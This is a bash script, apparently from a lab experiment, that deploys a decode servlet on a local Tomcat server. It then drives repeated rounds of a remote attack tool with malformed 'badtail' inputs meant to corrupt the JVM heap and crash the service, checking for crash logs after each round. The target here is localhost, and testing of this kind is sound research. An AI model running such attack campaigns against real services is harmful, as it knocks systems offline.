#!/usr/bin/env bash
# campaign3.sh - cache variant: keep the corrupted object alive so GC scans its header.
set -u
SRC=$HOME/lab-stack
BASE=/srv/tc

WORK=$(mktemp -d); mkdir -p "$WORK/WEB-INF/classes"
SERVLET_JAR=$(ls /usr/share/java/tomcat10-servlet-api*.jar | head -1)
javac -cp "$SERVLET_JAR" -d "$WORK/WEB-INF/classes" "$SRC/DecodeServlet.java" || exit 1
cp "$SRC/web.xml" "$WORK/WEB-INF/web.xml"
(cd "$WORK" && jar cf /tmp/dec.war .) || exit 1

export CATALINA_HOME=/usr/share/tomcat10 CATALINA_BASE=$BASE JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
"$CATALINA_HOME/bin/catalina.sh" stop >/dev/null 2>&1 || true
sleep 2; pkill -f 'catalina.base=/srv/tc' >/dev/null 2>&1 || true; sleep 1
rm -rf "$BASE/webapps/dec" "$BASE/webapps/dec.war" "$BASE/work/Catalina"
cp /tmp/dec.war "$BASE/webapps/dec.war"
nohup "$CATALINA_HOME/bin/catalina.sh" run >"$BASE/logs/stdout.log" 2>&1 &
sleep 10

alive() { curl -s -m 3 "http://127.0.0.1/dec/decode?b=aGVsbG8=" >/dev/null && echo up || echo DOWN; }
echo "before: $(alive)"
echo -n "decode3 sanity: "; curl -s -m 5 "http://127.0.0.1/dec/decode3?b=aGVsbG8="; echo

cd "$HOME/java4shell" || exit 1
for round in 1 2 3 4 5; do
  java src/RemoteAttack.java --target http://127.0.0.1/dec/decode3 --param b \
       --attempts 60000 --shape badtail 2>&1 | grep -E '^  badtail' | sed "s/^/round $round: /"
  st=$(alive); echo "  after: $st"
  if [ "$st" = "DOWN" ]; then
    echo "!! service DOWN after round $round"
    echo "hs_err: $(ls -1 $BASE/hs_err_pid*.log 2>/dev/null | tail -2 | tr '\n' ' ')"
    break
  fi
done
echo
echo "final hs_err: $(ls -1 $BASE/hs_err_pid*.log 2>/dev/null | tail -3 | tr '\n' ' ')"
tail -6 "$BASE/logs/stdout.log"
